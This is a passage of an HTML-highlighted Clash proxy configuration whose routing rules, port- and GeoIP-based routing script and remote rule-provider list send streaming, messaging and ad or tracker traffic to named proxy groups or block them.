<span class="string">RULE-SET,Youku,Asian</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,WeTV,Asian</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,ABC,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Abema</span> <span class="string">TV,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Amazon,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Apple</span> <span class="string">Music,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Apple</span> <span class="string">News,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Apple</span> <span class="string">TV,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Bahamut,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,BBC</span> <span class="string">iPlayer,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,DAZN,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Discovery</span> <span class="string">Plus,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,encoreTVB,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Fox</span> <span class="string">Now,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Fox+,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,HBO</span> <span class="string">Go,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,HBO</span> <span class="string">Max,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Hulu</span> <span class="string">Japan,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Hulu,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Japonx,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,JOOX,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,KKBOX,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,KKTV,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Line</span> <span class="string">TV,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,myTV</span> <span class="string">SUPER,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Niconico,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Pandora,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,PBS,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Pornhub,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Soundcloud,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,ViuTV,Global</span> <span class="string">TV</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Telegram,Telegram</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Discord,Proxy</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Steam,Steam</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Speedtest,Speedtest</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,PayPal,PayPal</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Microsoft,Microsoft</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Apple,Apple</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Google</span> <span class="string">FCM,Google</span> <span class="string">FCM</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Scholar,Scholar</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,PROXY01,Proxy</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,PROXY02,Proxy</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Domestic,Domestic</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,Domestic</span> <span class="string">IPs,Domestic</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">RULE-SET,LAN,DIRECT</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">GEOIP,CN,Domestic</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">MATCH,Others</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">DOMAIN-SUFFIX,macime.sogou.com,REJECT</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">DOMAIN-SUFFIX,ime.sogou.com,REJECT</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">DOMAIN-SUFFIX,pinyin.sogou.com,REJECT</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">DOMAIN-SUFFIX,account.sogou.com,REJECT</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">DOMAIN-SUFFIX,shouji.sogou.com,REJECT</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">DOMAIN-SUFFIX,get.sogou.com,REJECT</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">PROCESS-NAME,SogouServices,REJECT</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">PROCESS-NAME,SogouTaskManager,REJECT</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">PROCESS-NAME,SOgouTaskManager,REJECT</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">PROCESS-NAME,SogouInput,REJECT</span></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line">  <span class="attr">code:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    def main(ctx, metadata):</span></span><br><span class="line"><span class="string">        ruleset_action = &#123;&quot;Advertising&quot;: &quot;AdBlock&quot;,</span></span><br><span class="line"><span class="string">            &quot;Advertising_Domain&quot;: &quot;AdBlock&quot;,</span></span><br><span class="line"><span class="string">            &quot;BanAD&quot;: &quot;AdBlock&quot;,</span></span><br><span class="line"><span class="string">            &quot;Hijacking&quot;: &quot;AdBlock&quot;,</span></span><br><span class="line"><span class="string">            &quot;Privacy&quot;: &quot;AdBlock&quot;,</span></span><br><span class="line"><span class="string">            &quot;Privacy_Domain&quot;: &quot;AdBlock&quot;,</span></span><br><span class="line"><span class="string">            &quot;AdguardDNS&quot;: &quot;AdBlock&quot;,</span></span><br><span class="line"><span class="string">            &quot;Special&quot;: &quot;DIRECT&quot;,</span></span><br><span class="line"><span class="string">            &quot;Netflix&quot;: &quot;Netflix&quot;,</span></span><br><span class="line"><span class="string">            &quot;Spotify&quot;: &quot;Spotify&quot;,</span></span><br><span class="line"><span class="string">            &quot;YouTube&quot;: &quot;YouTube&quot;,</span></span><br><span class="line"><span class="string">            &quot;Disney Plus&quot;: &quot;Disney&quot;,</span></span><br><span class="line"><span class="string">            &quot;Bilibili&quot;: &quot;Asian TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;IQ&quot;: &quot;Asian TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;IQIYI&quot;: &quot;Asian TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Letv&quot;: &quot;Asian TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Netease Music&quot;: &quot;Asian TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Tencent Video&quot;: &quot;Asian TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Youku&quot;: &quot;Asian TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;WeTV&quot;: &quot;Asian TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;ABC&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Abema TV&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Amazon&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Apple Music&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Apple News&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Apple TV&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Bahamut&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;BBC iPlayer&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;DAZN&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Discovery Plus&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;encoreTVB&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Fox Now&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Fox+&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;HBO Go&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;HBO Max&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Hulu Japan&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Hulu&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Japonx&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;JOOX&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;KKBOX&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;KKTV&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Line TV&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;myTV SUPER&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Niconico&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Pandora&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;PBS&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Pornhub&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Soundcloud&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;ViuTV&quot;: &quot;Global TV&quot;,</span></span><br><span class="line"><span class="string">            &quot;Telegram&quot;: &quot;Telegram&quot;,</span></span><br><span class="line"><span class="string">            &quot;Discord&quot;: &quot;Discord&quot;,</span></span><br><span class="line"><span class="string">            &quot;Steam&quot;: &quot;Steam&quot;,</span></span><br><span class="line"><span class="string">            &quot;Speedtest&quot;: &quot;Speedtest&quot;,</span></span><br><span class="line"><span class="string">            &quot;PayPal&quot;: &quot;PayPal&quot;,</span></span><br><span class="line"><span class="string">            &quot;Microsoft&quot;: &quot;Microsoft&quot;,</span></span><br><span class="line"><span class="string">            &quot;Apple&quot;: &quot;Apple&quot;,</span></span><br><span class="line"><span class="string">            &quot;Google FCM&quot;: &quot;Google FCM&quot;,</span></span><br><span class="line"><span class="string">            &quot;Scholar&quot;: &quot;Scholar&quot;,</span></span><br><span class="line"><span class="string">            &quot;PROXY01&quot;: &quot;Proxy&quot;,</span></span><br><span class="line"><span class="string">            &quot;PROXY02&quot;: &quot;Proxy&quot;,</span></span><br><span class="line"><span class="string">            &quot;Domestic&quot;: &quot;Domestic&quot;,</span></span><br><span class="line"><span class="string">            &quot;Domestic IPs&quot;: &quot;Domestic&quot;,</span></span><br><span class="line"><span class="string">            &quot;LAN&quot;: &quot;DIRECT&quot;</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">        <span class="string">port</span> <span class="string">=</span> <span class="string">int(metadata[&quot;dst_port&quot;])</span></span><br><span class="line"></span><br><span class="line">        <span class="string">if</span> <span class="string">metadata[&quot;network&quot;]</span> <span class="string">==</span> <span class="string">&quot;UDP&quot;</span> <span class="string">and</span> <span class="string">port</span> <span class="string">==</span> <span class="attr">443:</span></span><br><span class="line">            <span class="string">ctx.log(&#x27;[Script]</span> <span class="string">matched</span> <span class="string">QUIC</span> <span class="string">traffic</span> <span class="string">use</span> <span class="string">reject&#x27;)</span></span><br><span class="line">            <span class="string">return</span> <span class="string">&quot;REJECT&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="string">port_list</span> <span class="string">=</span> [<span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">53</span>, <span class="number">80</span>, <span class="number">123</span>, <span class="number">143</span>, <span class="number">194</span>, <span class="number">443</span>, <span class="number">465</span>, <span class="number">587</span>, <span class="number">853</span>, <span class="number">993</span>, <span class="number">995</span>, <span class="number">998</span>, <span class="number">2052</span>, <span class="number">2053</span>, <span class="number">2082</span>, <span class="number">2083</span>, <span class="number">2086</span>, <span class="number">2095</span>, <span class="number">2096</span>, <span class="number">3389</span>, <span class="number">5222</span>, <span class="number">5228</span>, <span class="number">5229</span>, <span class="number">5230</span>, <span class="number">8080</span>, <span class="number">8443</span>, <span class="number">8880</span>, <span class="number">8888</span>, <span class="number">8889</span>]</span><br><span class="line">        <span class="attr">if port not in port_list:</span></span><br><span class="line">            <span class="string">ctx.log(&#x27;[Script]</span> <span class="string">not</span> <span class="string">common</span> <span class="string">port</span> <span class="string">use</span> <span class="string">direct&#x27;)</span></span><br><span class="line">            <span class="string">return</span> <span class="string">&quot;DIRECT&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="string">if</span> <span class="string">metadata[&quot;dst_ip&quot;]</span> <span class="string">==</span> <span class="string">&quot;&quot;</span><span class="string">:</span></span><br><span class="line">            <span class="string">metadata[&quot;dst_ip&quot;]</span> <span class="string">=</span> <span class="string">ctx.resolve_ip(metadata[&quot;host&quot;])</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">for ruleset in ruleset_action:</span></span><br><span class="line">            <span class="string">if</span> <span class="string">ctx.rule_providers[ruleset].match(metadata):</span></span><br><span class="line">                <span class="string">return</span> <span class="string">ruleset_action[ruleset]</span></span><br><span class="line"></span><br><span class="line">        <span class="string">if</span> <span class="string">metadata[&quot;dst_ip&quot;]</span> <span class="type">!=</span> <span class="string">&quot;&quot;</span><span class="string">:</span></span><br><span class="line">            <span class="string">code</span> <span class="string">=</span> <span class="string">ctx.geoip(metadata[&quot;dst_ip&quot;])</span></span><br><span class="line">            <span class="string">if</span> <span class="string">code</span> <span class="string">==</span> <span class="attr">&quot;CN&quot;:</span></span><br><span class="line">                <span class="string">ctx.log(&#x27;[Script]</span> <span class="string">Geoip</span> <span class="string">CN&#x27;)</span></span><br><span class="line">                <span class="string">return</span> <span class="string">&quot;Domestic&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="string">ctx.log(&#x27;[Script]</span> <span class="string">FINAL&#x27;)</span></span><br><span class="line">        <span class="string">return</span> <span class="string">&quot;Others&quot;</span></span><br><span class="line"><span class="attr">rule-providers:</span></span><br><span class="line">  <span class="attr">Advertising:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Advertising/Advertising.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Reject</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Advertising_Domain:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">domain</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Advertising/Advertising_Domain.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Reject</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">BanAD:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/BanAD.list</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Reject</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span>  </span><br><span class="line">  <span class="attr">Hijacking:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Hijacking/Hijacking.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Reject</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Privacy:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Privacy/Privacy.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Reject</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Privacy_Domain:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">domain</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Privacy/Privacy_Domain.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Reject</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">AdguardDNS:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/AdGuardSDNSFilter/AdGuardSDNSFilter_Classical.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Reject</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span>    </span><br><span class="line">  <span class="attr">Special:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://fastly.jsdelivr.net/gh/dler-io/Rules@main/Clash/Provider/Special.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Special</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Netflix:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Netflix/Netflix.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Netflix</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Spotify:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Spotify/Spotify.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Spotify</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">YouTube:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/YouTube/YouTube.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/YouTube</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Bilibili:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/BiliBili/BiliBili.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Bilibili</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">IQ:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/iQIYIIntl/iQIYIIntl.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/IQI</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">IQIYI:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/iQIYI/iQIYI.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/IQYI</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Letv:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/LeTV/LeTV.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Letv</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Netease Music:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/NetEaseMusic/NetEaseMusic.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Netease_Music</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Tencent Video:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/TencentVideo/TencentVideo.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Tencent_Video</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Youku:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Youku/Youku.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Youku</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">WeTV:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/WeTV/WeTV.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/WeTV</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">ABC:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/ABC/ABC.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/ABC</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Abema TV:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/AbemaTV/AbemaTV.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Abema_TV</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Amazon:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Amazon/Amazon.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Amazon</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Apple Music:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/AppleMusic/AppleMusic.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Apple_Music</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Apple News:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/AppleNews/AppleNews.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Apple_News</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Apple TV:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/AppleTV/AppleTV.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Apple_TV</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Bahamut:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Bahamut/Bahamut.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Bahamut</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">BBC iPlayer:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/BBC/BBC.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/BBC_iPlayer</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">DAZN:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/DAZN/DAZN.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/DAZN</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Discovery Plus:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span 